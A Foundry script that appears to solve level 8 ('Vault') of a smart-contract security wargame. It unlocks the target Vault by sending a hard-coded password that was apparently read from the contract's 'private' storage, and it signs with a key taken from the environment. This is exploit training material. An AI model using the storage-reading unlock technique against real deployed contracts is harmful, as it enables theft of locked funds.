pragma solidity ^0.8.0;

import "../src/level8.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Solution is Script {

    Vault public ins = Vault(0x0cA3b4E742F770aF35a961e521Ea2eed88EFe3EF);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        ins.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
        vm.stopBroadcast();
    }
}